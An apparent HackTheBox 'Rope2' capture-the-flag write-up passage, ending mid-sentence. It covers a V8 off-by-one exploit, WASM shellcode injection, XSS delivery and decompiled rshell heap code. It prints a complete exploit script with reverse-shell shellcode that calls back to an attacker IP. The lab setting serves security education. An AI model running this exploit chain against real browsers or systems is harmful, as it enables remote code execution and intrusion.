gdb ./d8 GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git [..snip..] Reading symbols from ./d8...done. gef➤ r --allow-natives-syntax Starting program: /home/d4mian/Pwning/v8/out.gn/x64.debug/d8 --allow-natives-syntax [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;. [New Thread 0x7ffff254f700 (LWP 8196)] V8 version 8.5.0 (candidate) d8\u0026gt; var arr = [1.1, 2.2, 3.3]; undefined d8\u0026gt; %DebugPrint(arr) DebugPrint: 0xe81080c5e45: [JSArray] - map: 0x0e8108281909 \u0026lt;Map(PACKED_DOUBLE_ELEMENTS)\u0026gt; [FastProperties] - prototype: 0x0e810824923d \u0026lt;JSArray[0]\u0026gt; - elements: 0x0e81080c5e25 \u0026lt;FixedDoubleArray[3]\u0026gt; [PACKED_DOUBLE_ELEMENTS] - length: 3 - properties: 0x0e81080406e9 \u0026lt;FixedArray[0]\u0026gt; { #length: 0x0e81081c0165 \u0026lt;AccessorInfo\u0026gt; (const accessor descriptor) } - elements: 0x0e81080c5e25 \u0026lt;FixedDoubleArray[3]\u0026gt; { 0: 1.1 1: 2.2 2: 3.3 } 0xe8108281909: [Map] - type: JS_ARRAY_TYPE - instance size: 16 - inobject properties: 0 - elements kind: PACKED_DOUBLE_ELEMENTS - unused property fields: 0 - enum length: invalid - back pointer: 0x0e81082818e1 \u0026lt;Map(HOLEY_SMI_ELEMENTS)\u0026gt; - prototype_validity cell: 0x0e81081c0451 \u0026lt;Cell value= 1\u0026gt; - instance descriptors #1: 0x0e8108249911 \u0026lt;DescriptorArray[1]\u0026gt; - transitions #1: 0x0e810824995d \u0026lt;TransitionArray[4]\u0026gt;Transition array #1: 0x0e8108042f3d \u0026lt;Symbol: (elements_transition_symbol)\u0026gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -\u0026gt; 0x0e8108281931 \u0026lt;Map(HOLEY_DOUBLE_ELEMENTS)\u0026gt; - prototype: 0x0e810824923d \u0026lt;JSArray[0]\u0026gt; - constructor: 0x0e8108249111 \u0026lt;JSFunction Array (sfi = 0xe81081cc41d)\u0026gt; - dependent code: 0x0e81080401ed \u0026lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)\u0026gt; - construction counter: 0 [1.1, 2.2, 3.3] Now, breaking it down, we have the arr located at the 0xe81080c5e45 which is of type JSArray and it has it\u0026rsquo;s map located at the 0x0e8108281909, other than that, according to the information, it has a map of PACKED_DOUBLE_ELEMENTS which references to the arr having elements of double type. The element pointer is located at the 0x0e81080c5e25 which is of length 3 and is of type FixedDoubleArray. Now, using the gdb, we check the memory contents around the arr.\nTo check the memory contents of the address, we need to subtract 1 from the address, such that we get absolute address for the analysis.\n^C [..snip..] gef➤ x/4wx 0xe81080c5e45 - 1 0xe81080c5e44:\t0x08281909\t\u0026lt;----- Map 0x080406e9 \u0026lt;---- Properties 0x080c5e25 \u0026lt;----- Element Array\t0x00000006 From the debug information, using the %DebugPrint(arr), and the gdb output, we can see that the 1st element belongs to the map of the array itself, the second belongs to the Properties, the third belongs to the elements array. If you pay attention, I used the x/wx which will show the address as 32 bit representation, the thing here is, the version of the commit made to the V8 engine was after the integration of the pointer compression, which made the addresses to be representated as the 32 bit integer.\ngef➤ x/5xg 0x0e81080c5e25 - 1 0xe81080c5e24:\t0x0000000608040a3d\t0x3ff199999999999a 0xe81080c5e34:\t0x400199999999999a\t0x400a666666666666 0xe81080c5e44:\t0x080406e908281909 gef➤ p/d 0x3ff199999999999a $2 = 4607632778762754458 gef➤ p/f 0x3ff199999999999a $3 = 1.1000000000000001 gef➤ p/f 0x400199999999999a $4 = 2.2000000000000002 Now, since we know how an array is represented into the V8 heap and we also know that we have Off by One read and write vulnerability, which draw us to the conclusion of the we have the ability to overwrite the Map of an object. With this in mind, let\u0026rsquo;s move on:-\nFirst off, we need to make the utility functions such that we can deal with the pointer tagging and change the floating values to decimal and vice versa. The following JavaScript function will let us do the work mentioned:-\nvar buf = new ArrayBuffer(8); // 8 byte array buffer var f64_buf = new Float64Array(buf); var u64_buf = new Uint32Array(buf); function ftoi(val, size) { f64_buf[0] = val; if(size == 32) { return BigInt(u64_buf[0]); } else if(size == 64) { return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) \u0026lt;\u0026lt; 32n); } } function itof(val, size) { if(size == 32) { u64_buf[0] = Number(val \u0026amp; 0xffffffffn); } else if(size == 64) { u64_buf[0] = Number(val \u0026amp; 0xffffffffn); u64_buf[1] = Number(val \u0026gt;\u0026gt; 32n); } return f64_buf[0]; } The above functions are used to convert the float to integer and integer to floats, since the memory address are going to be overwritten by their respected values as float, we need those.\nMoving on, we need to create some float arrays, to get the required leaks, we also need them for doing the fakeobj and the addrof primitve, without further ado, let\u0026rsquo;s start:-\nvar float_arr = [1.1, 2.2, 3.3, 4.4, 5.5]; var obj = {\u0026#34;A\u0026#34;:1.1}; var reg = [1, 2, 3, 4]; These are the variables that will be involved further in the exploit, next off, we need to get the addrof primitve, this means we need to leverage the off by one to read address of an object, let\u0026rsquo;s see:-\nvar float_arr_map = ftoi(float_arr.GetLastElement(), 32) var reg_arr_map = float_arr_map - 0xa0n; console.log(\u0026#34;[*] Float array map : 0x\u0026#34; + float_arr_map.toString(16)); console.log(\u0026#34;[*] Regular array map : 0x\u0026#34; + reg_arr_map.toString(16)); function addrof(in_obj) { float_arr.SetLastElement(itof(reg_arr_map, 32)); float_arr[0] = in_obj; float_arr.SetLastElement(itof(float_arr_map, 32)); let addr = float_arr[0]; return ftoi(addr, 64) } Here, first we get the map address of the float_arr and the reg array, then we have a function named addrof, this takes an object as the argument that would be the object address we need to get the address of, what we do is first overwrite the float_arr map object with the reg array, this means, as of now, the map address of the float_arr is pointing to the map of the reg array, then we make the first object of the float_arr to that of object we need to get the address of, then we place the map of the float_arr right back to where it was.\nConsidering, we have a map leak, if we try to read what is stored at that address, it will result in:-\nSuccess, with this out of the way, as of the v8 exploitation goes, we need to have a fakeobj primitive. The fakeobj function is below:-\nfunction fakeobj(addr) { float_arr[0] = itof(addr, 32); float_arr.SetLastElement(itof(reg_arr_map, 32)); let fake = float_arr[0]; float_arr.SetLastElement(itof(float_arr_map, 32)); return fake; } Let\u0026rsquo;s talk about the fakeobj function, this primitive, in context of this vulnerability and specific patch, we put the address of the fake object we want to put, it is placed onto the first element of the float_arr, then we changed the map of the float_arr to the reg array\u0026rsquo;s map, so when we tend to access the data from the 0th index, how this works is:-\nWe put the address of the object we wamt to overwrite another object with. Set the map of the map of the float_arr to the map of the reg Get the fake object from the float_arr Put the map of the float_arr back to it\u0026rsquo;s original place These are the primitives, we needed to have before we jump into the read/write primitive, although with these out of the way, we can now work on our functions arb_read and arb_write which will be used to read address from/write values to an address respectively.\nMoving on, the arbitrary read function is of interested and I\u0026rsquo;ll try my best to explain, for the moment, consider the following function which is used to read a value from the arbitrary address:-\nvar rw_helper = [itof(float_arr_map, 64), 1.1, 2.2, 3.3]; var rw_helper_addr = addrof(rw_helper) \u0026amp; 0xffffffffn; console.log(\u0026#34;[+] Controlled RW helper address: 0x\u0026#34; + rw_helper_addr.toString(16)); function arb_read(addr) { let fake = fakeobj(rw_helper_addr - 0x20n); rw_helper[1] = itof((0x8n \u0026lt;\u0026lt; 32n) + addr - 0x8n, 64); return ftoi(fake[0], 64); } This function works by first, making a fake object via the fakeobj function, then we put the address we want to read from, it is written to the 1st index of the rw_helper array, then the first element from the fake object is wrong, this is the follow up of the function, which left the understanding of the whole logic, I explained it in steps with the help of the the d8 binary and showing it:-\nWe create the fakeobjwith the address of the rw_helper, we subtracted 0x20 from it because the 32 bytes are for the layout of the memory, in this case, we did it because\u0026gt;:-\ngef➤ r --shell ./xpl.js --allow-natives-syntax Starting program: /home/d4mianwayne/Pwning/HackTheBox/htb-rope2/d8 --shell ./xpl.js --allow-natives-syntax [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;. [New Thread 0x7ffff7c1c700 (LWP 157278)] [New Thread 0x7ffff741b700 (LWP 157279)] [New Thread 0x7ffff6c1a700 (LWP 157280)] [*] Float array map : 0x8241909 [*] Regular array map : 0x8241869 [+] Controlled RW helper address: 0x808a14d V8 version 8.5.0 (candidate) d8\u0026gt; %DebugPrint(rw_helper); 0x16d50808a14d \u0026lt;JSArray[4]\u0026gt; [6.7481182e-316, 1.1, 2.2, 3.3] d8\u0026gt; ^C gef➤ x/10xg 0x05a00808a14d - 1 - 0x30 0x5a00808a11c:\t0x0000393638313432\t0x0000000808040a3d 0x5a00808a12c:\t0x0000000008241909\t0x3ff199999999999a 0x5a00808a13c:\t0x400199999999999a\t0x400a666666666666 0x5a00808a14c:\t0x080406e908241909\t0x000000080808a125 0x5a00808a15c:\t0x0000000208040975\t0x0000000008241909 gef➤ x/10xg 0x05a00808a14d - 1 - 0x20 0x5a00808a12c:\t0x0000000008241909\t0x3ff199999999999a 0x5a00808a13c:\t0x400199999999999a\t0x400a666666666666 0x5a00808a14c:\t0x080406e908241909\t0x000000080808a125 0x5a00808a15c:\t0x0000000208040975\t0x0000000008241909 0x5a00808a16c:\t0x0000000008040975\t0x0000000008040245 gef➤ p 0x05a00808a14d - 0x20 $5 = 0x5a00808a12d gef➤ p 0x05a00808a14d - 0x20 - 1 $6 = 0x5a00808a12c If we place a fake object at the address `0x5a00808a12c`, we would be able to get the access to the index 1, which would be the `0x5a00808a13c`. This way, the resulted fake object would point to the value of the address we wanted. As for the write function, that also worked on the same princpile of the read function:-\nfunction arb_write(addr, value) { let fake = fakeobj(rw_helper_addr - 0x20n); rw_helper[1] = itof((0x8n \u0026lt;\u0026lt; 32n) + addr - 0x8n, 64); fake[0] = itof(value, 64); } This, if we break down the logic:-\nThis, if compared to the function of the arb_read, this instead of returning the first value from fake array which was the result of faking the object, it overwrites the value that was stored at the first index. return ftoi(fake[0], 64); The above is from the arb_read.\nfake[0] = itof(value, 64); This is done by overwriting the value which was being returned in ther read function, from here we will leverage for the inital writing to, what we refer as the WebAssembly Page in JS, so initially, you cannot start off with the classic pwn challenges one could use the approach of overwriting the __free_hook with of system, then spawn a shell, in the v8 based challenges, mostly CTFs, this is done by creation of a wasm function which would result in the creation of a rwx permission page in the memory layout of the program, from here the approach is following:-\nFind the rwx segment address, calculate the address of it. Write the shellcode to the area of the rwx segment. Call the wasm function created earlier, since shellcode would be written to that function, calling it will eventually result in the shellcode execution. var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3, 130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131, 128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128, 128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0, 0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]); var wasm_module = new WebAssembly.Module(wasmCode); var wasm_instance = new WebAssembly.Instance(wasm_module); var pwn = wasm_instance.exports.main; This is the JS code which is used to create pwn function which would reside in the rwx section, with this step aside, let\u0026rsquo;s move on:-\nvar wasm_instance_addr = addrof(wasm_instance) \u0026amp; 0xffffffffn; var rwx = arb_read(wasm_instance_addr + 0x68n \u0026amp; 0xffffffffn); First off, we needed to find the base address of the rwx segment, this was easier to find since, all I had to do is to find the address stored throught the memory and from what offset, it was exactly located at, I used the gef\u0026rsquo;s search-pattern rwx_address and found the reference of that memory located at the offset wasm_instance_addr + 0x68:-\ngef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x00002f81a4494000 0x00002f81a4495000 0x0000000000000000 rwx 0x00003ce700000000 0x00003ce70000c000 0x0000000000000000 rw- 0x00003ce70000c000 0x00003ce700040000 0x0000000000000000 --- 0x00003ce700040000 0x00003ce700041000 0x0000000000000000 rw- 0x00003ce700041000 0x00003ce700042000 0x0000000000000000 --- 0x00003ce700042000 0x00003ce700052000 0x0000000000000000 r-x 0x00003ce700052000 0x00003ce70007f000 0x0000000000000000 --- [..snip..] gef➤ search-pattern 0x00002f81a4494000 [+] Searching \u0026#39;\\x00\\x40\\x49\\xa4\\x81\\x2f\\x00\\x00\u0026#39; in memory [+] In (0x3ce708080000-0x3ce70818d000), permission=rw- 0x3ce70808a78c - 0x3ce70808a7ac → \u0026#34;\\x00\\x40\\x49\\xa4\\x81\\x2f\\x00\\x00[...]\u0026#34; 0x3ce70808a7d8 - 0x3ce70808a7f8 → \u0026#34;\\x00\\x40\\x49\\xa4\\x81\\x2f\\x00\\x00[...]\u0026#34; [+] In (0x3ce708200000-0x3ce708280000), permission=rw- 0x3ce708211230 - 0x3ce708211250 → \u0026#34;\\x00\\x40\\x49\\xa4\\x81\\x2f\\x00\\x00[...]\u0026#34; [+] In \u0026#39;[heap]\u0026#39;(0x55555648d000-0x55555658a000), permission=rw- 0x5555564dc618 - 0x5555564dc638 → \u0026#34;\\x00\\x40\\x49\\xa4\\x81\\x2f\\x00\\x00[...]\u0026#34; 0x5555564df560 - 0x5555564df580 → \u0026#34;\\x00\\x40\\x49\\xa4\\x81\\x2f\\x00\\x00[...]\u0026#34; [..snip..] gef➤ p 0x00003ce700000000 + 0x82111c9 $1 = 0x3ce7082111c9 gef➤ p 0x3ce708211230 - 0x3ce7082111c9 $2 = 0x67 With the above out of the way, we need to know make use of DataView and ArrayBuffer as this will help you in overwriting the address with the desired value, in short these two functions allows you to write the data in binary format using the ArrayBuffer.\nconsole.log(\u0026#34;[+] Wasm instance address: 0x\u0026#34; + wasm_instance_addr.toString(16)); console.log(\u0026#34;[*] RWX INSTANCE: 0x\u0026#34; + rwx.toString(16)); var arr_buf = new ArrayBuffer(0x100); var dataview = new DataView(arr_buf); The backing store of an ArrayBuffer can be considered as same as the elements pointer of a JSArray. It is found at offset \u0026amp;ArrayBuffer+0x14, which you can find out by using the x64.debug version of d8 binary. The principle of this is that instead of using a fakeobj to write directly to an arbitrary address, we use the fakeobj to do the arb-write and modify the backing store of a legitimate ArrayBuffer to our arbitrary address, which in this case would be overwritten with the rwx segment. Now, we can use dataview.setBigUint64(0, val, true) to write our val as a little-endian 64 bit value to our arbitrary address. This is shown below:-\nvar arr_buf_addr = addrof(arr_buf) \u0026amp; 0xffffffffn;; var back_store_addr = arb_read(arr_buf_addr + 0x14n); console.log(\u0026#34;[+] ArrayBuffer address: 0x\u0026#34; + arr_buf_addr.toString(16)); console.log(\u0026#34;[+] Back store pointer: 0x\u0026#34; + back_store_addr.toString(16)); arb_write(arr_buf_addr + 0x14n, rwx); var shellcode = [ 0x48, 0x31, 0xf6, 0x56, 0x48, 0x8d, 0x3d, 0x32, 0x00, 0x00, 0x00, 0x57, 0x48, 0x89, 0xe2, 0x56, 0x48, 0x8d, 0x3d, 0x0c, 0x00, 0x00, 0x00, 0x57, 0x48, 0x89, 0xe6, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xcc, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x67, 0x6e, 0x6f, 0x6d, 0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c, 0x61, 0x74, 0x6f, 0x72, 0x00, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x00 ]; // shellcode for spawning calculator8 for (let i = 0; i \u0026lt; shellcode.length; i++) { dataview.setUint8(i, shellcode[i], true); } Now, this aside, we just call the function pwn which would result in the execution of the shellcode:-\npwn(); Run the exploit as ./d8 ./xpl.js and we will see a successful calc pop:-\nAs it worked on d8, we must try it on the chrome binary which was distributed along from the port 8000, to run the exploit, we have to make a HTML file in which we will include the pwn.js file, the idea here is to use --no-sandbox which ultimately means no sandbox escape is being and all the JIT code must be executed on the system itself, the HTML file:-\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;script src=\u0026#34;xpl.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;/html\u0026gt; Running the given chrome binary as ./chrome --no-sandbox ./xpl.html resulted in the calculator being popped:-\nNow, with this aside, first off I changed the shellcode from the previous to reverse shell shellcode, for which we will be using the exploit to get reverse shell, the final exploit looked like this:-\nvar float_arr = [1.1, 2.2, 3.3, 4.4, 5.5]; var obj = {\u0026#34;A\u0026#34;:1.1}; var reg = [1, 2, 3, 4]; var buf = new ArrayBuffer(8); // 8 byte array buffer var f64_buf = new Float64Array(buf); var u64_buf = new Uint32Array(buf); function ftoi(val, size) { f64_buf[0] = val; if(size == 32) { return BigInt(u64_buf[0]); } else if(size == 64) { return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) \u0026lt;\u0026lt; 32n); } } function itof(val, size) { if(size == 32) { u64_buf[0] = Number(val \u0026amp; 0xffffffffn); } else if(size == 64) { u64_buf[0] = Number(val \u0026amp; 0xffffffffn); u64_buf[1] = Number(val \u0026gt;\u0026gt; 32n); } return f64_buf[0]; } var float_arr_map = ftoi(float_arr.GetLastElement(), 32) var reg_arr_map = float_arr_map - 0xa0n; console.log(\u0026#34;[*] Float array map : 0x\u0026#34; + float_arr_map.toString(16)); console.log(\u0026#34;[*] Regular array map : 0x\u0026#34; + reg_arr_map.toString(16)); function addrof(in_obj) { float_arr.SetLastElement(itof(reg_arr_map, 32)); float_arr[0] = in_obj; float_arr.SetLastElement(itof(float_arr_map, 32)); let addr = float_arr[0]; return ftoi(addr, 64) } function fakeobj(addr) { float_arr[0] = itof(addr, 32); float_arr.SetLastElement(itof(reg_arr_map, 32)); let fake = float_arr[0]; float_arr.SetLastElement(itof(float_arr_map, 32)); return fake; } var rw_helper = [itof(float_arr_map, 64), 1.1, 2.2, 3.3]; var rw_helper_addr = addrof(rw_helper) \u0026amp; 0xffffffffn; console.log(\u0026#34;[+] Controlled RW helper address: 0x\u0026#34; + rw_helper_addr.toString(16)); function arb_read(addr) { let fake = fakeobj(rw_helper_addr - 0x20n); rw_helper[1] = itof((0x8n \u0026lt;\u0026lt; 32n) + addr - 0x8n, 64); return ftoi(fake[0], 64); } function arb_write(addr, value) { let fake = fakeobj(rw_helper_addr - 0x20n); rw_helper[1] = itof((0x8n \u0026lt;\u0026lt; 32n) + addr - 0x8n, 64); fake[0] = itof(value, 64); } var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3, 130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131, 128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128, 128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0, 0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]); var wasm_module = new WebAssembly.Module(wasmCode); var wasm_instance = new WebAssembly.Instance(wasm_module); var pwn = wasm_instance.exports.main; var wasm_instance_addr = addrof(wasm_instance) \u0026amp; 0xffffffffn; var rwx = arb_read(wasm_instance_addr + 0x68n \u0026amp; 0xffffffffn); console.log(\u0026#34;[+] Wasm instance address: 0x\u0026#34; + wasm_instance_addr.toString(16)); console.log(\u0026#34;[*] RWX INSTANCE: 0x\u0026#34; + rwx.toString(16)); var arr_buf = new ArrayBuffer(0x100); var dataview = new DataView(arr_buf); var arr_buf_addr = addrof(arr_buf) \u0026amp; 0xffffffffn;; var back_store_addr = arb_read(arr_buf_addr + 0x14n); console.log(\u0026#34;[+] ArrayBuffer address: 0x\u0026#34; + arr_buf_addr.toString(16)); console.log(\u0026#34;[+] Back store pointer: 0x\u0026#34; + back_store_addr.toString(16)); arb_write(arr_buf_addr + 0x14n, rwx); var shellcode = [72, 49, 192, 72, 131, 192, 41, 72, 49, 255, 72, 137, 250, 72, 131, 199, 2, 72, 49, 246, 72, 131, 198, 1, 15, 5, 72, 137, 199, 72, 49, 192, 80, 72, 131, 192, 2, 199, 68, 36, 252, 10, 10, 14, 14, 102, 199, 68, 36, 250, 17, 92, 102, 137, 68, 36, 248, 72, 131, 236, 8, 72, 131, 192, 40, 72, 137, 230, 72, 49, 210, 72, 131, 194, 16, 15, 5, 72, 49, 192, 72, 137, 198, 72, 131, 192, 33, 15, 5, 72, 49, 192, 72, 131, 192, 33, 72, 49, 246, 72, 131, 198, 1, 15, 5, 72, 49, 192, 72, 131, 192, 33, 72, 49, 246, 72, 131, 198, 2, 15, 5, 72, 49, 192, 80, 72, 187, 47, 98, 105, 110, 47, 47, 115, 104, 83, 72, 137, 231, 80, 72, 137, 226, 87, 72, 137, 230, 72, 131, 192, 59, 15, 5]; for (let i = 0; i \u0026lt; shellcode.length; i++) { dataview.setUint8(i, shellcode[i], true); } console.log(\u0026#34;[+] Spawning a shell...\u0026#34;); pwn(); Now, the obstacle was, where exactly are we supposed to submit the exploit to, there are no chrome instance running on any port, is there? But then, there was this /contact on the port 8000, at this point, I wasn\u0026rsquo;t sure much either, so knowing the comment kind of template might have the XSS vulnerability, this was the only way that seemed to make sense, so giving the exploit as \u0026lt;script\u0026gt;exploit\u0026lt;/script\u0026gt; in the message body and having our netcat listener waiting for the connection, we get the shell as chromeuser User #After getting the foothold on the machine as chromeuser, looking over in the /home folder there were two directories which include r4j and chromeuser and since the /home/chromeuser didn\u0026rsquo;t had user.txt or anything else that would hint towards something, I started doing the basic enumeration for finding the SUID binaries, which showed the following binaries:-\nchromeuser@rope2:~$ find / -perm -u=s -type f 2\u0026gt;/dev/null /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/bin/newgrp /usr/bin/fusermount /usr/bin/rshell /usr/bin/mount /usr/bin/at /usr/bin/chfn /usr/bin/passwd /usr/bin/gpasswd /usr/bin/umount /usr/bin/chsh /usr/bin/su /usr/bin/sudo Out of all the listed binaries, the rshell stood out the most, running the binary was functioning as follows:-\nchromeuser@rope2:~$ /usr/bin/rshell $ ls $ add 1 size: 100 content: sss $ ls 1 $ whoami r4j $ id uid=1000(r4j) gid=1000(r4j) groups=1000(r4j) $ ^C chromeuse Knowing the author, I assumed this rshell binary is going to be about binary exploitation, this meant it was time to transfer it to the machine of mine and start to dissect it to know the flow of it.\nTcache Heap Exploitation # main function #void __fastcall __noreturn main(__int64 a1, char **a2, char **a3) { int v3; // [rsp+Ch] [rbp-D4h] char s[200]; // [rsp+10h] [rbp-D0h] unsigned __int64 v5; // [rsp+D8h] [rbp-8h] v5 = __readfsqword(0x28u); initialize(); memset(s, 0, 0xC8uLL); while ( 1 ) { do { printf(\u0026#34;$ \u0026#34;); v3 = read(0, s, 0xC7uLL); } while ( v3 \u0026lt;= 1 ); s[v3 - 1] = 0; rshell(s); } } The main functions runs in a while loop, then it takes input via read showing the prompt $, there\u0026rsquo;s a call to the initialize function which was as follows:-\nunsigned __int64 initialize() { int i; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); setreuid(0x3E8u, 0x3E8u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); for ( i = 0; i \u0026lt;= 1; ++i ) { memset(\u0026amp;directory_file_pointer[26 * i + 1], 0, 0xC8uLL); directory_file_pointer[26 * i] = 0LL; } return __readfsqword(0x28u) ^ v2; } It just setus the buffereing and do memset on the global array named directory_file_pointers, the rshell function was defined as follows. The rshell function seems to have 4 options including id, ls, add, rm and edit which proposed the basic functionality of the shell:-\nunsigned __int64 __fastcall rshell(char *a1) { unsigned __int64 v2; // [rsp+28h] [rbp-8h] v2 = __readfsqword(0x28u); if ( !strcmp(a1, \u0026#34;ls\u0026#34;) ) { print_directory(); } else if ( !strncmp(a1, \u0026#34;add \u0026#34;, 4uLL) ) { add(a1 + 4); } else if ( !strncmp(a1, \u0026#34;rm \u0026#34;, 3uLL) ) { remove(a1 + 3); } else if ( !strncmp(a1, \u0026#34;echo \u0026#34;, 5uLL) ) { puts(a1 + 5); } else if ( !strncmp(a1, \u0026#34;edit \u0026#34;, 5uLL) ) { edit(a1 + 5); } else if ( !strcmp(a1, \u0026#34;whoami\u0026#34;) ) { puts(\u0026#34;r4j\u0026#34;); } else if ( !strcmp(a1, \u0026#34;id\u0026#34;) ) { puts(\u0026#34;uid=1000(r4j) gid=1000(r4j) groups=1000(r4j)\u0026#34;); } else { printf(\u0026#34;rshell: %s: command not found\\n\u0026#34;, a1); } return __readfsqword(0x28u) ^ v2; } Allocated chunks here are referred to files in context of the binary\nSeeing this, when we do ls, it calls print_directory which showed the list of allocated files, then for add, edit and rm it calls their respective functions and the last one being the id which just prints the string uid=1000(r4j) gid=1000(r4j) groups=1000(r4j), so this was doing nothing,\nadd function #This function was responsible for handling the workflow of adding new files:-\nunsigned __int64 __fastcall add(const char *a1) { size_t size; // [rsp+1Ch] [rbp-14h] int i; // [rsp+24h] [rbp-Ch] unsigned __int64 v4; // [rsp+28h] [rbp-8h] v4 = __readfsqword(0x28u); if ( directory_file_pointer[0] \u0026amp;\u0026amp; qword_4130 ) { puts(\u0026#34;Memory Error!\u0026#34;); } else { for ( HIDWORD(size) = 0; SHIDWORD(size) \u0026lt;= 1; ++HIDWORD(size) ) { if ( !strcmp(\u0026amp;directory_file_pointer[26 * SHIDWORD(size) + 1], a1) ) { puts(\u0026#34;rshell: file exists\u0026#34;); return __readfsqword(0x28u) ^ v4; } } for ( i = 0; i \u0026lt;= 1; ++i ) { if ( !directory_file_pointer[26 * i] ) { strncpy(\u0026amp;directory_file_pointer[26 * i + 1], a1, 0xBEuLL); LODWORD(size) = 0; printf(\u0026#34;size: \u0026#34;); __isoc99_scanf(\u0026#34;%u\u0026#34;, \u0026amp;size); getchar(); if ( size \u0026lt;= 0x70 ) { directory_file_pointer[26 * i] = malloc(size); if ( !directory_file_pointer[26 * i] ) exit(1); printf(\u0026#34;content: \u0026#34;); fgets(directory_file_pointer[26 * i], size, stdin); } else { puts(\u0026#34;Memory Error!\u0026#34;); memset(\u0026amp;directory_file_pointer[26 * i + 1], 0, 0xC8uLL); } return __readfsqword(0x28u) ^ v4; } } } return __readfsqword(0x28u) ^ v4; } I\u0026rsquo;d advise you to go through the code yourself, but the functionality of this function can be summed up as following:-\nFirst off, it checks if there\u0026rsquo;s no allocated chunks already if it does, whether it exceeds the memory limit, if so, print \u0026quot;Memmory Error\u0026quot;. Second, it iterates over the allocated chunks and comapare if the chunk name we are allocating is already available or not. Then it asks for the size and checks if it is less than 0x78 or not, the size constraint hinted towards the tcache. Then it allocates a chunk on heap with the size defined and attempt to take the input via fgets on that chunk. The takeaways from this function are as follows:-\nThe number of chunks(files) we can add is 2 at most. The size accepted for the chunk allocation is restricted to the 0x78, for which we can safely assume we will deal with tcache. rm function #The rm function which was responsible for removing chunks(files) from the binary was handled by this function:-\nunsigned __int64 __fastcall remove(const char *a1) { int i; // [rsp+14h] [rbp-Ch] unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); for ( i = 0; i \u0026lt;= 1; ++i ) { if ( !strcmp(a1, \u0026amp;directory_file_pointer[26 * i + 1]) \u0026amp;\u0026amp; directory_file_pointer[26 * i] ) { memset(\u0026amp;directory_file_pointer[26 * i + 1], 0, 0xC8uLL); free(directory_file_pointer[26 * i]); directory_file_pointer[26 * i] = 0LL; return __readfsqword(0x28u) ^ v3; } } printf(\u0026#34;rm: cannot remove \u0026#39;%s\u0026#39;: No such file or directory\\n\u0026#34;, a1); return __readfsqword(0x28u) ^ v3; } This function was responsible for deleting files(chunks) from the global array, the function can be summed up as:-\nIt checks whether te specified files is in the gloabl array directory_file_pointer. Then it does the memset(chunk, 0x0, 0xc8) which means whatever content was stored at that chunk would be 0x0 once we do rm. After that, it free that chunk and set the global pointer to NULL, totally making this function from being a victim of Use After Free. Takeaways from this functions are:-\nOnce free\u0026rsquo;d, the chunks would not contain any data. After being free\u0026rsquo;d, it NULLs out the global pointer which held the pointer for the heap chunks. No Use After Free from this function. edit function #We also have a function called edit, this one was of a great interest:-\nunsigned __int64 __fastcall edit(const char *a1) { size_t size; // [rsp+18h] [rbp-18h] void *v3; // [rsp+20h] [rbp-10h] unsigned __int64 v4; // [rsp+28h] [rbp-8h] v4 = __readfsqword(0x28u); for ( HIDWORD(size) = 0; ; ++HIDWORD(size) ) { if ( SHIDWORD(size) \u0026gt; 1 ) { puts(\u0026#34;rshell: No such file or directory\u0026#34;); return __readfsqword(0x28u) ^ v4; } if ( !strcmp(a1, \u0026amp;directory_file_pointer[26 * SHIDWORD(size) + 1]) \u0026amp;\u0026amp; directory_file_pointer[26 * SHIDWORD(size)] ) break; } LODWORD(size) = 0; printf(\u0026#34;size: \u0026#34;); __isoc99_scanf(\u0026#34;%u\u0026#34;, \u0026amp;size); getchar(); if ( size \u0026lt;= 0x70 ) { v3 = realloc(directory_file_pointer[26 * SHIDWORD(size)], size); if ( v3 ) { directory_file_pointer[26 * SHIDWORD(size)] = v3; printf(\u0026#34;content: \u0026#34;); read(0, directory_file_pointer[26 * SHIDWORD(size)], size); } else { puts(\u0026#34;Error\u0026#34;); } } else { puts(\u0026#34;Memory Error!\u0026#34;); } return __readfsqword(0x28u) ^ v4; } Did you saw the catch here? If not, don\u0026rsquo;t worry, I couldn\u0026rsquo;t either at first time, but let\u0026rsquo;s break down the functionality of this function such that the logic of it becomes clear:-\nFirst off, this function checks whether the file(chunk), we requested for the edit is in the global arrat directory_file_pointer or not, if it does, proceed. Then it asks for the size, for which it\u0026rsquo;ll be used to read new content. The size constraint here also hinted towards the tcache involvement. Then it does realloc with the size given and second argument being the chunk. Attempt to read into that extended chunk with the new data we wanted to store. Vulnerability #The cue for this binary was the 